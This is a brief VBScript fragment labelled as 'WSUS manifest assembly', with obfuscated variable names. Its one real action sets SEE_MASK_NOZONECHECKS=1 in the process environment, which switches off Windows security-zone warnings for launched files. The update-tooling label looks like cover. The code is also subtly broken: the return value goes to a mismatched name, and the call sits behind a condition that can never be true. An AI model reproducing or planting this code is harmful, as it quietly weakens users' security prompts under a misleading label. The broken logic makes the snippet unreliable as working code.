' --- WSUS manifest assembly ---
Function DecodeManifest39()
On Error Resume Next
  Dim blnExists68,strConfigData68,blnSynced21
  Set blnExists68=CreateObject("WScript.Shell")
  strConfigData68=blnExists68.ExpandEnvironmentStrings("%TEMP%")
  blnSynced21=blnExists68.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strConfigData68)>0 And Len(blnSynced21)>0 Then
    blnExists68.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ParseRegistryChunk88=1
    Exit Function
  End If
  ParseRegistryChunk88=0
End Function

If Weekday(Now) > 7 Then
  Call DecodeManifest39()
End If


